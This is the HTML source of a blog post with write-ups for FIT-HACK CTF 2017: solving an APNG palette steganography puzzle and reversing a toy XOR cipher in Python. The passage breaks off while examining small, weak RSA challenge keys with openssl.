@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>FIT-HACK CTF 2017 - Write-ups | RawSec</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="security,web,crypto,writeups,ctf,misc,recon" />
+    
+    <meta name="description" content="Informations
+Version
+
+
+
+By
+Version
+Comment
+
+
+
+
+noraj
+1.0
+Creation
+
+
+
+CTF
+
+Name : FIT-HACK CTF 2017
+Website : ctf.nw.fit.ac.jp
+Type : Online
+Format : Jeopardy
+CTF Time : link
+
+250 - Color - Misc
+
+Check">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FIT-HACK CTF 2017 - Write-ups">
+<meta property="og:url" content="https://rawsec.ml/en/FIT-HACK-2017-write-ups/index.html">
+<meta property="og:site_name" content="RawSec">
+<meta property="og:description" content="Informations
+Version
+
+
+
+By
+Version
+Comment
+
+
+
+
+noraj
+1.0
+Creation
+
+
+
+CTF
+
+Name : FIT-HACK CTF 2017
+Website : ctf.nw.fit.ac.jp
+Type : Online
+Format : Jeopardy
+CTF Time : link
+
+250 - Color - Misc
+
+Check">
+<meta property="og:image" content="https://rawsec.ml/images/ctf.png">
+<meta property="og:updated_time" content="2017-04-15T16:04:37.071Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="FIT-HACK CTF 2017 - Write-ups">
+<meta name="twitter:description" content="Informations
+Version
+
+
+
+By
+Version
+Comment
+
+
+
+
+noraj
+1.0
+Creation
+
+
+
+CTF
+
+Name : FIT-HACK CTF 2017
+Website : ctf.nw.fit.ac.jp
+Type : Online
+Format : Jeopardy
+CTF Time : link
+
+250 - Color - Misc
+
+Check">
+<meta name="twitter:image" content="https://rawsec.ml/images/ctf.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="RawSec" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.0.3/jquery.min.js"></script>
+    
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38006582-2', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+
+
+    <link rel="canonical" href="https://rawsec.ml" />
+</head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                        <h2 class="subtitle-wrap">
+                            <p class="subtitle">Security is everywhere</p>
+                        </h2>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/tags/linux/">Linux</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/tags/news/">News</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/tags/security/">Security</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/about/">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/security/">security</a><i class="icon fa fa-angle-right"></i><a class="page-title-link" href="/categories/security/writeups/">writeups</a>
+    </h1>
+</div>
+                        <div class="main-body-content">
+                            <article id="post-FIT-HACK-2017-write-ups" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        FIT-HACK CTF 2017 - Write-ups
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-subtitle">
+                <a href="/en/FIT-HACK-2017-write-ups/" class="article-date">
+    <time datetime="2017-04-14T22:00:00.000Z" itemprop="datePublished">Saturday 15 April 2017 (2017-04-15)</time>
+</a>
+                
+    <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/crypto/">crypto</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/">misc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/recon/">recon</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/security/">security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeups/">writeups</a></li></ul>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <h2 id="informations">Informations</h2>
+<h3 id="version">Version</h3>
+<table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ctf">CTF</h3>
+<ul>
+<li><strong>Name</strong> : FIT-HACK CTF 2017</li>
+<li><strong>Website</strong> : <a href="https://ctf.nw.fit.ac.jp/" target="_blank" rel="external">ctf.nw.fit.ac.jp</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/451" target="_blank" rel="external">link</a></li>
+</ul>
+<h2 id="250-color-misc">250 - Color - Misc</h2>
+<blockquote>
+<p>Check the color information.</p>
+<p><a href="https://ctf.nw.fit.ac.jp/files/65178aab3a9035f27ff94b161d445305/image.zip" target="_blank" rel="external">Image.zip</a></p>
+</blockquote>
+<p>So it's a PNG:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file image.png</div><div class="line">image.png: PNG image data, 300 x 300, 8-bit colormap, non-interlaced</div></pre></td></tr></table></figure></p>
+<p>Our PNG has a color palette:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ pnginfo image.png</div><div class="line">image.png...</div><div class="line">  Image Width: 300 Image Length: 300</div><div class="line">  Bitdepth (Bits/Sample): 8</div><div class="line">  Channels (Samples/Pixel): 1</div><div class="line">  Pixel depth (Pixel Depth): 8</div><div class="line">  Colour Type (Photometric Interpretation): PALETTED COLOUR (0 colours, 0 transparent)</div><div class="line">  Image filter: Single row per byte filter</div><div class="line">  Interlacing: No interlacing</div><div class="line">  Compression Scheme: Deflate method 8, 32k window</div><div class="line">  Resolution: 0, 1342587364 (Unknown value for unit stored)</div><div class="line">  FillOrder: msb-to-lsb</div><div class="line">  Byte Order: Network (Big Endian)</div><div class="line">  Number of text strings: 0 of 0</div></pre></td></tr></table></figure></p>
+<p>The PNG seems valid:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ pngcheck image.png</div><div class="line">zlib warning:  different version (expected 1.2.8, using 1.2.11)</div><div class="line"></div><div class="line">OK: image.png (300x300, 8-bit palette+trns, non-interlaced, 90.9%).</div></pre></td></tr></table></figure></p>
+<p>Let's verify and see the chuncks:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">$ pngchunks image.png</div><div class="line">Chunk: Data Length 13 (max 2147483647), Type 1380206665 [IHDR]</div><div class="line">  Critical, public, PNG 1.2 compliant, unsafe to copy</div><div class="line">  IHDR Width: 300</div><div class="line">  IHDR Height: 300</div><div class="line">  IHDR Bitdepth: 8</div><div class="line">  IHDR Colortype: 3</div><div class="line">  IHDR Compression: 0</div><div class="line">  IHDR Filter: 0</div><div class="line">  IHDR Interlace: 0</div><div class="line">  IHDR Compression algorithm is Deflate</div><div class="line">  IHDR Filter method is type zero (None, Sub, Up, Average, Paeth)</div><div class="line">  IHDR Interlacing is disabled</div><div class="line">  Chunk CRC: 1319337543</div><div class="line">Chunk: Data Length 8 (max 2147483647), Type 1280598881 [acTL]</div><div class="line">  Ancillary, private, PNG 1.2 compliant, unsafe to copy</div><div class="line">  ... Unknown chunk type</div><div class="line">  Chunk CRC: -1821571854</div><div class="line">Chunk: Data Length 57 (max 2147483647), Type 1163152464 [PLTE]</div><div class="line">  Critical, public, PNG 1.2 compliant, unsafe to copy</div><div class="line">  ... Unknown chunk type</div><div class="line">  Chunk CRC: 1193133337</div><div class="line">Chunk: Data Length 1 (max 2147483647), Type 1397641844 [tRNS]</div><div class="line">  Ancillary, public, PNG 1.2 compliant, unsafe to copy</div><div class="line">  ... Unknown chunk type</div><div class="line">  Chunk CRC: 1088870502</div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
+<p>The <code>PLTE</code> (palette) chunck seems corrupted (critical). That's maybe why we got <code>PALETTED COLOUR (0 colours, 0 transparent)</code>.</p>
+<p>A tool can reveal us that our image is an APNG (Animated PNG like GIF) that was created by APNG Assembler 2.9:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Type:    Portable network graphics</div><div class="line">Mode:    ColorMap</div><div class="line"></div><div class="line">Checking Meta Data</div><div class="line"></div><div class="line">Size                     : 300x300</div><div class="line">Bit Depth                : 8</div><div class="line">Color Type               : Color and Palette</div><div class="line">Compression Used         : Deflate</div><div class="line">Filter Method            : Adaptive Filtering</div><div class="line">Interlace Method         : No Interlace</div><div class="line">Palettes                 : 19</div><div class="line">Software                 : APNG Assembler 2.9</div></pre></td></tr></table></figure></p>
+<p>Let's split the chuncks:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ pngsplit image.png</div><div class="line">pngsplit, version 0.60 BETA of 11 February 2007, by Greg Roelofs.</div><div class="line">  This software is licensed under the GNU General Public License.</div><div class="line">  There is NO warranty.</div><div class="line"></div><div class="line">image.png:</div><div class="line"></div><div class="line">$ ls</div><div class="line">image.png            image.png.0004.tRNS  image.png.0009.fcTL  image.png.0014.fdAT  image.png.0019.fcTL  image.png.0024.fdAT  image.png.0029.fcTL  image.png.0034.fdAT  image.png.0039.fcTL</div><div class="line">image.png.0000.sig   image.png.0005.fcTL  image.png.0010.fdAT  image.png.0015.fcTL  image.png.0020.fdAT  image.png.0025.fcTL  image.png.0030.fdAT  image.png.0035.fcTL  image.png.0040.fdAT</div><div class="line">image.png.0001.IHDR  image.png.0006.IDAT  image.png.0011.fcTL  image.png.0016.fdAT  image.png.0021.fcTL  image.png.0026.fdAT  image.png.0031.fcTL  image.png.0036.fdAT  image.png.0041.tEXt</div><div class="line">image.png.0002.acTL  image.png.0007.fcTL  image.png.0012.fdAT  image.png.0017.fcTL  image.png.0022.fdAT  image.png.0027.fcTL  image.png.0032.fdAT  image.png.0037.fcTL  image.png.0042.IEND</div><div class="line">image.png.0003.PLTE  image.png.0008.fdAT  image.png.0013.fcTL  image.png.0018.fdAT  image.png.0023.fcTL  image.png.0028.fdAT  image.png.0033.fcTL  image.png.0038.fdAT</div></pre></td></tr></table></figure></p>
+<p>Now let's see our strange <code>PLTE</code> chunck:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ xxd image.png.0003.PLTE</div><div class="line">00000000: 0000 0039 504c 5445 1212 1246 4954 4772  ...9PLTE...FITGr</div><div class="line">00000010: 615f 4e33 5f50 3062 6c33 6335 5f64 3372  a_N3_P0bl3c5_d3r</div><div class="line">00000020: 6675 6c69 355f 696d 6170 6869 726b 5f72  fuli5_imaphirk_r</div><div class="line">00000030: 7461 7433 6474 7730 7730 6e7b 416e 7d00  tat3dtw0w0n&#123;An&#125;.</div><div class="line">00000040: 0047 1dc5 19                             .G...</div><div class="line"></div><div class="line">$ strings image.png.0003.PLTE</div><div class="line">9PLTE</div><div class="line">FITGra_N3_P0bl3c5_d3rfuli5_imaphirk_rtat3dtw0w0n&#123;An&#125;</div></pre></td></tr></table></figure></p>
+<p>The string looks like the flag but mixed up.</p>
+<p>We can get quite the same conclusion with just a strings on the image:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ strings image.png</div><div class="line">IHDR</div><div class="line">acTL</div><div class="line">9PLTE</div><div class="line">FITGra_N3_P0bl3c5_d3rfuli5_imaphirk_rtat3dtw0w0n&#123;An&#125;</div><div class="line">tRNS</div><div class="line">fcTL</div><div class="line">IDATx</div><div class="line"></div><div class="line">[...]</div><div class="line"></div><div class="line">fcTL</div><div class="line">fdAT</div><div class="line">tEXtSoftware</div><div class="line">APNG Assembler 2.9&amp;[</div><div class="line">IEND</div></pre></td></tr></table></figure></p>
+<p>I read a lot of stuff about steganography methods that sort palette in a different order to hide a text in the image but didn't find how to do it in practice. And our strings (that looks like the flag) is some plain text, it's not hidden in the image. Maybe the palette was the key or something to re-order the flag.</p>
+<p>But I just did it by hand and guessed that <code>FITGra_N3_P0bl3c5_d3rfuli5_imaphirk_rtat3dtw0w0n{An}</code> have <code>FIT{}</code> + only 4 uppercase letters <code>APNG</code>. What a coincidence! And we have all the (1337) letters to make <code>Animated Portable Network Graphics</code>. With the letters left I can finnaly write: <code>FIT{Animat3d_P0rtabl3_N3tw0rk_Graphic5_i5_w0nd3rful}</code>.</p>
+<p><strong>Note</strong>: That's was not the normal way to solve it but guessable flag are too bad!</p>
+<h2 id="100-simple-cipher-crypto">100 - Simple cipher - Crypto</h2>
+<blockquote>
+<p>I got an encrypted message and a file I used for encryption.
+However I do not know what to do, so I want you to solve it instead.</p>
+</blockquote>
+<p>enc_text.txt = <code>0c157e2b7f7b515e075b391f143200080a00050316322b272e0d525017562e73183e3a0d564f6718</code></p>
+<p>And <a href="http://encryption.py" target="_blank" rel="external">encryption.py</a> looks like:</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">mes = <span class="string">"*****secret*****"</span></div><div class="line">key = <span class="string">"J2msBeG8"</span></div><div class="line"></div><div class="line"><span class="comment"># padding with spaces</span></div><div class="line"><span class="keyword">if</span> len(mes) % len(key) != <span class="number">0</span>:</div><div class="line">    n = len(key) - len(mes) % len(key)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">        mes += <span class="string">" "</span></div><div class="line"></div><div class="line">m = []</div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(len(key)):</div><div class="line">    i = a</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(len(mes)/len(key)):</div><div class="line">        m.append(ord(mes[i]) ^ ord(key[a]))</div><div class="line">        i += len(key)</div><div class="line"></div><div class="line">enc_mes = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(m)):</div><div class="line">    enc_mes += <span class="string">"%02x"</span> % m[j]</div><div class="line"></div><div class="line"><span class="keyword">print</span> enc_mes</div></pre></td></tr></table></figure></p>
+<p>It's a non linear xoring.</p>
+<p>Example: message length is 16, key length is 8 (so 2 key loops).</p>
+<p>Normal xoring gives: m[0] ^ k[0], m[1] ^ k[1], m[2] ^ k[2], m[3] ^ k[3], m[4] ^ k[4], m[5] ^ k[5], m[6] ^ k[6], m[7] ^ k[7], m[8] ^ k[0], m[9] ^ k[1], m[10] ^ k[2], m[11] ^ k[3], m[12] ^ k[4], m[13] ^ k[5], m[14] ^ k[6], m[15] ^ k[7]</p>
+<p>The modified xoring gives: m[0] ^ k[0], m[8] ^ k[0], m[1] ^ k[1], m[9] ^ k[1], m[2] ^ k[2], m[10] ^ k[2], m[3] ^ k[3], m[11] ^ k[3], m[4] ^ k[4], m[12] ^ k[4], m[5] ^ k[5], m[13] ^ k[5], m[6] ^ k[6], m[14] ^ k[6], m[7] ^ k[7], m[15] ^ k[7]</p>
+<p>In our case: message length is 40, key length is 8 (so 5 key loops).</p>
+<p>So I wrote the python lines that does exactly the reverse process, we can test with the default message:</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">key = <span class="string">"J2msBeG8"</span></div><div class="line">mes = <span class="string">"*****secret*****"</span></div><div class="line"></div><div class="line"><span class="comment"># padding with spaces</span></div><div class="line"><span class="keyword">if</span> len(mes) % len(key) != <span class="number">0</span>:</div><div class="line">    n = len(key) - len(mes) % len(key)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">        mes += <span class="string">" "</span></div><div class="line"></div><div class="line">m = []</div><div class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(len(key)):</div><div class="line">    i = a</div><div class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> range(len(mes)/len(key)):</div><div class="line">        m.append(ord(mes[i]) ^ ord(key[a]))</div><div class="line">        i += len(key)</div><div class="line"></div><div class="line">enc_mes = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(m)):</div><div class="line">    enc_mes += <span class="string">"%02x"</span> % m[j]</div><div class="line"></div><div class="line"><span class="keyword">print</span> enc_mes</div><div class="line"></div><div class="line"><span class="comment">#enc_mes = "0c157e2b7f7b515e075b391f143200080a00050316322b272e0d525017562e73183e3a0d564f6718"</span></div><div class="line"></div><div class="line">enc_mes_splited = [enc_mes[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc_mes), <span class="number">2</span>)]</div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(enc_mes_splited)):</div><div class="line">    enc_mes_splited[j] = int(enc_mes_splited[j], <span class="number">16</span>)</div><div class="line"></div><div class="line">m = enc_mes_splited</div><div class="line">mes = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(len(enc_mes_splited)/len(key)):</div><div class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(len(key)):</div><div class="line">        mes += str(chr((m[len(enc_mes_splited)/len(key)*a+b]) ^ ord(key[a])))</div><div class="line"><span class="keyword">print</span> mes</div></pre></td></tr></table></figure></p>
+<p>And we find the original message:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python2 encryption.py</div><div class="line">60381857471959596868164f226d5b12</div><div class="line">*****secret*****</div></pre></td></tr></table></figure></p>
+<p>So now let's replace <code>enc_mess</code> with the challenge value and we find <code>FIT{Thi5_cryp74n4lysi5_wa5_very_5impl3}</code>.</p>
+<h2 id="100-it-s-solvable-crypto">100 - It's_solvable - Crypto</h2>
+<blockquote>
+<p>Easy?</p>
+<p><a href="https://ctf.nw.fit.ac.jp/files/1f24829f38d89d50cb5e90df1e03ecff/Its_solvable.zip" target="_blank" rel="external">File</a></p>
+</blockquote>
+<p>We have multiple public keys, and some encoded texts:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$ ls */</div><div class="line">39BCC1930B969051426F5864F24B478CEAFBA7D8/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">59E859397B1AB522AAF698D9D42D5F064FD11381/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">5A6DF720540C20D95D530D3FD6885511223D5D20/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">8090FD368C8382FD4B216C5BAA04C99769DFCC49/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">A1047EAB1035D58682A53557E0B2A75EDBFD15FD/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">C5E31D5915661DE4393E3F1489B00EBC4497DD48/:</div><div class="line">mfit  publicfit.pem</div><div class="line"></div><div class="line">C9CF2EF3AD15705851D02C005B381171AF921BD7/:</div><div class="line">fit  fitkey.pem</div></pre></td></tr></table></figure></p>
+<p>The RSA keys seems very weak (about 150 bit), the modulus is very small:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; 39BCC1930B969051426F5864F24B478CEAFBA7D8/publicfit.pem</div><div class="line">Public-Key: (153 bit)</div><div class="line">Modulus:</div><div class="line">    01:87:ff:1f:e5:90:c8:97:83:44:d6:16:72:0c:c1:</div><div class="line">    20:a0:ea:71:67</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; 59E859397B1AB522AAF698D9D42D5F064FD11381/publicfit.pem</div><div class="line">Public-Key: (148 bit)</div><div class="line">Modulus:</div><div class="line">    0c:12:08:7a:f4:11:24:16:7e:5b:f1:32:5c:04:75:</div><div class="line">    ab:d4:17:0f</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; 5A6DF720540C20D95D530D3FD6885511223D5D20/publicfit.pem</div><div class="line">Public-Key: (150 bit)</div><div class="line">Modulus:</div><div class="line">    39:c2:a4:61:db:f6:94:84:a2:30:13:80:b3:98:32:</div><div class="line">    6d:ee:51:d1</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; 8090FD368C8382FD4B216C5BAA04C99769DFCC49/publicfit.pem</div><div class="line">Public-Key: (151 bit)</div><div class="line">Modulus:</div><div class="line">    5d:5e:9f:10:7f:b1:38:59:d2:4c:85:77:3e:a4:ff:</div><div class="line">    8b:ef:8e:99</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; A1047EAB1035D58682A53557E0B2A75EDBFD15FD/publicfit.pem</div><div class="line">Public-Key: (149 bit)</div><div class="line">Modulus:</div><div class="line">    1a:ac:d3:c9:0d:1a:bd:fd:dd:de:18:35:f5:8a:88:</div><div class="line">    f0:36:8b:9f</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; C5E31D5915661DE4393E3F1489B00EBC4497DD48/publicfit.pem</div><div class="line">Public-Key: (154 bit)</div><div class="line">Modulus:</div><div class="line">    03:8a:f3:1e:59:8e:24:2b:5f:cf:1b:30:6f:df:f0:</div><div class="line">    e2:d6:6e:f2:39</div><div class="line">Exponent: 65537 (0x10001)</div><div class="line"></div><div class="line">$ openssl rsa -pubin -inform PEM -text -noout &lt; C9CF2EF3AD15705851D02C005B381171AF921BD7/fitkey.pem    </div><div class="line">Public-Key: (151 bit)</div><div class="line">Modulus:</div><div class="line">    65:7a:90:84:26:10:1a:fa:25:51:cf:ca:26:e3:9a:</div><div class="line">    f5:64:53:27</div><div class="line">Exponent: 65537 (0x10001)</div></pre></td></tr></table></figure></p>
+<p>Another way to show the modulus:</p>
